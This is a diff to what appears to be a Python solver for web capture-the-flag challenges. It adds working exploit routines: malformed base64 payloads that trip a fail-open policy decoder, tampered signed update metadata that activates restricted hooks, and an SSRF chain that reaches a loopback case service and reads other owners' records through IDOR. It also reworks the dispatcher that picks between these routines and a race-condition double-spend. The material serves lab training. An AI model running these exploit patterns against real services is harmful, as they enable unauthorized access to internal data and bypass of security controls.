@@ -20,8 +20,8 @@ Mastery is cumulative: a target's bug class is never assumed from the challenge'
 own name. `classify_and_recover` tries each recognized class in the evidence-led
 order below (same order the restored day-19/day-20 dispatcher used, extended with
 the three classes day-21 added, the one day-22 added, the two day-24 added, the
-three day-25 added, the one day-26 added, and the two stdlib classes day-27 added
-- `rec_double_spend` and `rec_proxy_trust_bypass`) and returns `None` if a target's
+three day-25 added, the one day-26 added, the two stdlib classes day-27 added,
+the two day-28 added, and the two day-29 added) and returns `None` if a target's
 evidence does not match anything known yet - that is a real signal for a new
 class, not a bug in this dispatcher.
 
@@ -43,6 +43,8 @@ every web solve.py for reusable patterns (`docs/web-solver-templates.md`)
 found it and promoted it; that same scan produced the drop-in worker starter
 and template modules under `solver_py_scripts/web_templates/`.
 """
+import base64
+import copy
 import json
 import re
 import time
@@ -542,14 +544,156 @@ def rec_forged_webhook_event(t, clues):
     return None
 
 
+def rec_fail_open_policy(t, clues):
+    """Malformed remote-policy payload reaches a fail-open decoder exception path.
+
+    Source: day-24-fail-open-friday (release day 28), graded in all three modes.
+    The format route discloses the parameter and per-attempt prefix; no valid-decision
+    baseline is needed for this stateless recovery."""
+    feature, format_route = clues.get("feature_route"), clues.get("policy_format_route")
+    if not feature or not format_route:
+        return None
+    status, fmt = t.get_json(format_route, save="policy_format")
+    if status != 200 or not isinstance(fmt, dict):
+        return None
+    param, prefix = fmt.get("query_parameter"), fmt.get("prefix")
+    if not param or prefix is None:
+        return None
+    payloads = (
+        "not-valid-base64!!!",
+        base64.urlsafe_b64encode(b"\x00\x01\x02not json").decode().rstrip("="),
+    )
+    for i, payload in enumerate(payloads):
+        query = urllib.parse.urlencode({param: str(prefix) + payload})
+        status, body = t.get(f"{feature}?{query}", save=f"fail_open_{i}")
+        match = PROOF_RE.search(body)
+        if match:
+            return match.group(0)
+    return None
+
+
+def rec_missing_log_event(t, clues, before=None):
+    """Report a privileged export whose decisive audit event is missing.
+
+    Source: day-25-if-a-breach-falls-in-a-log (release day 28). `before` is the
+    read-only secondary-route response used by the dispatcher to identify this
+    class, avoiding a duplicate request and any speculative feature-route probe."""
+    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
+    if not feature or not secondary:
+        return None
+    if before is None:
+        status, before = t.get_json(secondary, save="status_before")
+        if status != 200:
+            return None
+    fields = (before or {}).get("report", {}).get("fields", [])
+    if len(fields) < 3:
+        return None
+    id_field, missing_field, observed_field = fields[:3]
+    status, export = t.post_json(feature, {}, save="export")
+    if status != 200 or not isinstance(export, dict):
+        return None
+    export_id = export.get(id_field) or export.get("export_id")
+    operation = export.get("operation")
+    if not export_id or not operation:
+        return None
+    status, after = t.get_json(secondary, save="status_after")
+    if status != 200 or not isinstance(after, dict):
+        return None
+    observed = None
+    for event in after.get("events", []):
+        if event.get(id_field) == export_id or event.get("export_id") == export_id:
+            observed = event.get("event")
+            break
+    if not observed:
+        return None
+    report = {id_field: export_id, missing_field: operation, observed_field: observed}
+    status, result = t.post_json(secondary, report, save="report")
+    text = json.dumps(result) if isinstance(result, (dict, list)) else str(result or "")
+    match = PROOF_RE.search(text)
+    return match.group(0) if match else None
+
+
+def rec_unverified_update(t, clues):
+    """Activate an update with a restricted hook but its original signed metadata.
+
+    Source: day-26-trust-the-build (release day 29), graded across all modes. The
+    feed, policy, package object and restricted hook are all derived live."""
+    feature = clues.get("feature_route")
+    feed_route, policy_route = clues.get("update_feed"), clues.get("update_policy")
+    if not feature or not feed_route or not policy_route:
+        return None
+    status, feed = t.get_json(feed_route, save="update_feed")
+    if status != 200 or not isinstance(feed, dict):
+        return None
+    status, policy = t.get_json(policy_route, save="update_policy")
+    if status != 200 or not isinstance(policy, dict):
+        return None
+    restricted = [hook.get("name") for hook in policy.get("hooks", [])
+                  if hook.get("access") == "restricted" and hook.get("name")]
+    for number, original in enumerate(feed.get("updates", [])):
+        if not isinstance(original, dict) or not isinstance(original.get("artifact"), dict):
+            continue
+        for hook in restricted:
+            update = copy.deepcopy(original)
+            update["artifact"]["hook"] = hook
+            status, response = t.post_json(
+                feature, update, save=f"tampered_update_{number}_{hook}")
+            match = PROOF_RE.search(json.dumps(response))
+            if match:
+                return match.group(0)
+    return None
+
+
+def rec_internal_affairs(t, clues):
+    """Public server-side fetch -> disclosed loopback case service -> foreign IDOR.
+
+    Source: day-27-internal-affairs (release day 29). The internal URL is data in
+    the outer request, not a new target origin contacted by this client."""
+    feature = clues.get("feature_route")
+    topology_route = clues.get("topology_route")
+    directory_route = clues.get("case_directory_route")
+    role = clues.get("current_role")
+    if not all((feature, topology_route, directory_route, role)):
+        return None
+    status, topology = t.get_json(topology_route, save="topology")
+    if status != 200 or not isinstance(topology, dict):
+        return None
+    status, directory = t.get_json(directory_route, save="case_directory")
+    if status != 200 or not isinstance(directory, dict):
+        return None
+    status, hint_body = t.get(feature, save="feature_schema")
+    try:
+        hint = json.loads(hint_body)
+    except (TypeError, ValueError):
+        hint = None
+    fetch_param = ((hint or {}).get("query_parameter") if status == 400 else None) or "target"
+    service = topology.get("case_service")
+    if not service:
+        return None
+    for case in directory.get("cases", []):
+        if case.get("owner") == role or "id" not in case:
+            continue
+        parts = urllib.parse.urlsplit(service)
+        query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
+        query.append(("id", str(case["id"])))
+        internal = urllib.parse.urlunsplit(
+            parts._replace(query=urllib.parse.urlencode(query)))
+        outer = urllib.parse.urlencode({fetch_param: internal})
+        status, body = t.get(f"{feature}?{outer}", save=f"foreign_case_{case['id']}")
+        match = PROOF_RE.search(body)
+        if match:
+            return match.group(0)
+    return None
+
+
 def rec_double_spend(t, clues, racers=12):
     """`/api/clues` -> feature_route (POST; redeems one credit via a non-atomic
     check-then-decrement - reads the stored count, checks it is > 0, then writes
     count-1 back as two separate steps with no row lock/atomic UPDATE) +
     secondary_route (GET; reports the proof once the stored balance has gone
-    negative). Shares its bare two-key clue shape with `rec_ssrf` - no clue field
-    tells them apart, so `classify_and_recover` tries this class first and falls
-    back to SSRF on the same shape.
+    negative). Shares its bare two-key clue shape with `rec_ssrf` and the missing-log
+    class, so `classify_and_recover` first checks secondary_route read-only and selects
+    this recoverer only when that response discloses a `credits` balance.
     A single serial POST to feature_route behaves "correctly" (does not exhibit
     the bug) and permanently burns the target's one and only credit - there is no
     in-app reset/topup/refund route, so the race MUST be the very first touch of
@@ -666,6 +810,22 @@ def classify_and_recover(t, evidence=None, prompt="", initial=None):
 
     if clues_status == 200 and clues:
         evidence["clues"] = clues
+        if clues.get("feature_route") and clues.get("policy_format_route"):
+            evidence["classification"] = "fail-open remote policy decoder"
+            proof = rec_fail_open_policy(t, clues)
+            if proof:
+                return proof
+        if clues.get("feature_route") and clues.get("update_feed") and clues.get("update_policy"):
+            evidence["classification"] = "unverified dependency update"
+            proof = rec_unverified_update(t, clues)
+            if proof:
+                return proof
+        if all(clues.get(key) for key in
+               ("feature_route", "topology_route", "case_directory_route")):
+            evidence["classification"] = "SSRF followed by internal IDOR"
+            proof = rec_internal_affairs(t, clues)
+            if proof:
+                return proof
         if clues.get("session_hint") and clues.get("feature_route") and clues.get("secondary_route"):
             evidence["classification"] = "session fixation"
             proof = rec_session_fixation(t, clues)
@@ -687,16 +847,23 @@ def classify_and_recover(t, evidence=None, prompt="", initial=None):
             if proof:
                 return proof
         if clues.get("feature_route") and clues.get("secondary_route") and "inventory_route" not in clues:
-            # double-spend and SSRF share this exact bare two-key shape with no
-            # distinguishing clue field - try the race first, SSRF as the fallback.
-            evidence["classification"] = "credit double-spend (race)"
-            proof = rec_double_spend(t, clues)
-            if proof:
-                return proof
-            evidence["classification"] = "SSRF (fetch proxy to internal-only route)"
-            proof = rec_ssrf(t, clues)
-            if proof:
-                return proof
+            # Missing-log, double-spend and SSRF share this clue shape. A read-only
+            # secondary GET distinguishes them; never fire the one-shot race merely
+            # because the two routes exist.
+            status, probe = t.get_json(clues["secondary_route"], save="probe_secondary")
+            if status == 200 and isinstance(probe, dict) and probe.get("report", {}).get("fields"):
+                evidence["classification"] = "missing audit log event"
+                return rec_missing_log_event(t, clues, before=probe)
+            if status == 200 and isinstance(probe, dict) and "credits" in probe:
+                evidence["classification"] = "credit double-spend (race)"
+                return rec_double_spend(t, clues)
+            if status == 403 or (isinstance(probe, dict)
+                                 and probe.get("error") == "internal_service_only"):
+                evidence["classification"] = "SSRF (fetch proxy to internal-only route)"
+                return rec_ssrf(t, clues)
+            evidence["classification"] = (
+                "unclassified feature_route + secondary_route; secondary probe matched no known class")
+            return None
         if clues.get("feature_route") and clues.get("deployment") == "trusted_reverse_proxy":
             evidence["classification"] = "trusted-reverse-proxy header spoofing"
             proof = rec_proxy_trust_bypass(t, clues)
